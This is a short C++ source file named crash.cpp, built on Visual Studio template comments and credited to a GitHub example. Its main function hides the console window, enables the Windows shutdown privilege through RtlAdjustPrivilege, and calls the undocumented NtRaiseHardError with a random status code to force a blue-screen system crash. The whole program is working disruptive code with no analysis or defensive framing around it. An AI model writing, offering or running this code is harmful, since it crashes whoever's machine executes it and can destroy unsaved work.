// crash.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <time.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

// Declaration of RtlAdjustPrivilege and NtRaiseHardError
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

int main()
{
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Set current process priority class to highest available
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    // For error handling
    NTSTATUS error_ret = NULL;

    // Load ntdll.dll to current process
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll == NULL)
    {
        error_ret = STATUS_DLL_INIT_FAILED;
    }

    // Import address of RtlAdjustPrivilege and NtRaiseHardError
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL)
    {
        error_ret = STATUS_INVALID_ADDRESS;
    }

    // Activate shutdown privilege
    BOOLEAN bEnabled;
    NTSTATUS shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    if (!NT_SUCCESS(shutdown_priv))
    {
        error_ret = shutdown_priv;
    }

    // Push bsod
    srand((UINT32)time(NULL));
    ULONG uResp;
    NTSTATUS bsod = NtRaiseHardError((NTSTATUS)(0xC0000000 | ((rand() % 10) << 8) | ((rand() % 16) << 4) | rand() % 16), NULL, NULL, NULL, 6, &uResp);
    if (!NT_SUCCESS(bsod))
    {
        error_ret = bsod;
    }

}

//source https://github.com/AgnivaMaity/NtRaiseHardError-Example/blob/main/NtRaiseHardError.c

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
